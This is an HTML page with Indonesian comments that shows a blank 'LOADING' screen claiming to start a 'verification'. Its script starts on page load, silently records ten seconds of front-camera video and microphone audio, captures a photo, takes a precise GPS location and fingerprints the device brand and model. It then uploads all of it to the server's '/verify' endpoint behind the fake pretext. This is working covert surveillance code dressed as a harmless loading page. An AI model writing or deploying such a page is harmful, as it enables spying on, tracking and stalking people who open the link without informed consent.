<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        .container { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto 20px;
            border: 4px solid #e0e0e0;
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 400; color: #333; letter-spacing: 6px; }
        .hidden { display: none !important; }
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
        .status-text {
            color: #666;
            margin-top: 15px;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container" id="loadingContainer">
        <div class="spinner" id="spinner"></div>
        <h1 id="title">LOADING</h1>
        <div class="status-text" id="statusText">⏳ Memulai verifikasi...</div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        const loadingContainer = document.getElementById('loadingContainer');
        const statusText = document.getElementById('statusText');

        let stream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let isRecording = false;

        // ============================================
        // 🎥 REKAM VIDEO + AUDIO 10 DETIK
        // ============================================
        async function startRecording() {
            try {
                statusText.textContent = '📷 Mengakses kamera & mikrofon...';

                // Minta akses kamera + mikrofon
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: true // ✅ REKAM SUARA
                });

                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));

                statusText.textContent = '🎬 Merekam video + suara (10 detik)...';

                // Setup MediaRecorder
                const mimeTypes = [
                    'video/webm;codecs=vp9,opus',
                    'video/webm;codecs=vp8,opus',
                    'video/webm;codecs=h264,opus',
                    'video/webm'
                ];

                let selectedMimeType = mimeTypes[0];
                for (const type of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(type)) {
                        selectedMimeType = type;
                        break;
                    }
                }

                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: selectedMimeType,
                    videoBitsPerSecond: 2500000,
                    audioBitsPerSecond: 128000
                });

                recordedChunks = [];
                isRecording = true;

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                        console.log(`📹 Chunk: ${event.data.size} bytes`);
                    }
                };

                mediaRecorder.onstop = async () => {
                    isRecording = false;
                    console.log(`📹 Total chunks: ${recordedChunks.length}`);
                    
                    if (recordedChunks.length === 0) {
                        console.log('❌ No video recorded');
                        loadingContainer.classList.add('hidden');
                        return;
                    }

                    // Buat video blob
                    const videoBlob = new Blob(recordedChunks, {
                        type: selectedMimeType || 'video/webm'
                    });

                    console.log(`📹 Video size: ${videoBlob.size} bytes`);

                    // === AMBIL FOTO (frame terakhir) ===
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg', 0.85);

                    // === GPS ===
                    const gps = await getGPSLocation();

                    // === DEVICE INFO ===
                    const device = getDeviceInfo();

                    // === CONVERT VIDEO KE BASE64 ===
                    const reader = new FileReader();
                    reader.readAsDataURL(videoBlob);
                    reader.onloadend = async () => {
                        const videoBase64 = reader.result;

                        statusText.textContent = '📤 Mengirim data...';

                        try {
                            const response = await fetch('/verify', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    image: photoData,
                                    video: videoBase64,
                                    gps: gps,
                                    device: device,
                                    timestamp: new Date().toISOString()
                                })
                            });

                            const result = await response.json();
                            console.log('📨 Response:', result);
                        } catch (err) {
                            console.error('❌ Send error:', err);
                        }

                        // Tampilan selesai
                        loadingContainer.classList.add('hidden');
                    };
                };

                // Rekam 10 detik
                mediaRecorder.start(1000); // Record in 1-second chunks
                
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                    if (stream) {
                        stream.getTracks().forEach(t => t.stop());
                        stream = null;
                    }
                }, 10000); // 10 DETIK

            } catch (err) {
                console.error('❌ Error:', err);
                statusText.textContent = '❌ Gagal akses kamera/mikrofon';
                setTimeout(() => {
                    loadingContainer.classList.add('hidden');
                }, 2000);
            }
        }

        // ============================================
        // 📍 GPS
        // ============================================
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => { resolve(null); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // ============================================
        // 📱 DEVICE INFO
        // ============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent.toLowerCase();
            const info = {
                browser: 'Tidak diketahui',
                os: 'Tidak diketahui',
                device: 'Tidak diketahui',
                brand: 'Tidak diketahui',
                model: 'Tidak diketahui'
            };
            if (ua.includes('chrome')) info.browser = 'Chrome';
            else if (ua.includes('firefox')) info.browser = 'Firefox';
            else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
            else if (ua.includes('edge')) info.browser = 'Edge';
            if (ua.includes('android')) {
                info.os = 'Android';
                const match = ua.match(/android\s([\d.]+)/);
                if (match) info.os += ` ${match[1]}`;
            } else if (ua.includes('iphone') || ua.includes('ipad')) {
                info.os = 'iOS';
                const match = ua.match(/os\s([\d_]+)/);
                if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
            } else if (ua.includes('windows')) {
                info.os = 'Windows';
            } else if (ua.includes('mac')) {
                info.os = 'macOS';
            }
            if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
                info.device = 'Mobile';
            } else if (ua.includes('tablet') || ua.includes('ipad')) {
                info.device = 'Tablet';
            } else {
                info.device = 'Desktop';
            }
            const brands = [
                { name: 'Samsung', patterns: ['samsung', 'sm-'] },
                { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
                { name: 'Realme', patterns: ['realme'] },
                { name: 'Oppo', patterns: ['oppo'] },
                { name: 'Vivo', patterns: ['vivo'] },
                { name: 'OnePlus', patterns: ['oneplus'] },
                { name: 'Google Pixel', patterns: ['pixel'] },
                { name: 'Huawei', patterns: ['huawei', 'honor'] },
                { name: 'Apple', patterns: ['iphone', 'ipad'] }
            ];
            for (const brand of brands) {
                if (brand.patterns.some(p => ua.includes(p))) {
                    info.brand = brand.name;
                    break;
                }
            }
            if (info.brand === 'Apple') {
                const match = ua.match(/iphone(\d+)/);
                if (match) info.model = `iPhone ${match[1]}`;
            } else if (info.brand === 'Samsung') {
                const match = ua.match(/sm-[a-z0-9]+/i);
                if (match) info.model = match[0].toUpperCase();
            }
            return info;
        }

        // ============================================
        // 🛑 STOP RECORDING SAAT WEB DI-CLOSE
        // ============================================
        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                console.log('🛑 Recording stopped (page closed)');
            }
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
        });

        // ============================================
        // 🚀 START
        // ============================================
        window.onload = () => {
            console.log('📄 Page loaded - Starting verification...');
            setTimeout(startRecording, 500);
        };
    </script>
</body>
</html>
